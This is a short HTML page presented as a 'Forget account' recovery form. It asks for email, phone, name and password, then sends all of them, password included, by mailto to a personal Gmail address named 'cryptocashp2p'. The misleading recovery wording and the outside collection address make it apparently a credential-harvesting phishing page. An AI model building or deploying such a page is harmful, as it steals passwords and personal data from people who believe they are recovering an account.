<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forget</title>
</head>
<style>
    input, select, button {
        margin: 10px;
        padding: 5px;
    }
</style>
<body>
    <blockquote>
        <h1>Forget account</h1>
        <p>Your account will be changed to match the server information you provided.</p>
        <p>Just change the information you want to change and keep the rest as before.</p>
        <select id="cng">
            <option selected disabled>Change your info</option>
            <option value="Email">Email</option>
            <option value="Phone">Phone</option>
            <option value="Password">Password</option>
            <option value="Name">Name</option>
        </select><br>
        <input placeholder="Enter The Email" type="email" id="email"><br>
        <input placeholder="Enter The phone" type="number" id="phone"><br>
        <input placeholder="Enter The Name" type="name" id="name"><br>
        <input placeholder="Password" type="password" id="password"/><br>
        <button onclick="sendData()">Send</button>
   </blockquote> 
   <script>
    function sendData() {
        var data1 = document.getElementById("email").value;
        var data2 = document.getElementById("phone").value;
        var data3 = document.getElementById("name").value;
        var data4 = document.getElementById("password").value;
        var selectElement = document.getElementById("cng");
        var data5 = selectElement.options[selectElement.selectedIndex].value;

        // Encode data for safe transmission
        var subject = encodeURIComponent(`Forget account by ${data2}!`);
        var body = encodeURIComponent(
            `CNG Option: ${data5}%0A` + // %0A represents a new line
            `Email: ${data1}%0A` +
            `Phone: ${data2}%0A` +
            `Name: ${data3}%0A` +
            `Password: ${data4}`
        );

        // Construct mailto URL
        var mailtoLink = `mailto:cryptocashp2p@gmail.com?subject=${subject}&body=${body}`;

        // Open default email client
        window.location.href = mailtoLink;
    }
   </script>
</body>
</html>
